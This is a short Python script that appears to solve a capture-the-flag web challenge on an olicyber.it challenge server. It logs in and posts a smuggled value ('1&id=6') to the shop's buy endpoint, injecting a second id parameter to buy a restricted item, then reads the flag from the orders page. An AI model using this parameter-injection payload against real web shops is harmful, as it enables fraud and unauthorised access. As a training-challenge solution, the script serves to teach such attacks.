import requests
from bs4 import BeautifulSoup

url = "https://ntlfs.challs.olicyber.it/"

s = requests.Session()

s.post(url + "login.php", data={"username":"randomuser"})
s.post(url + "buy.php", data={"id":"1&id=6"})
r = s.get(url + "orders.php")

flag = BeautifulSoup(r.text, "html.parser").find("p")
print(flag.text)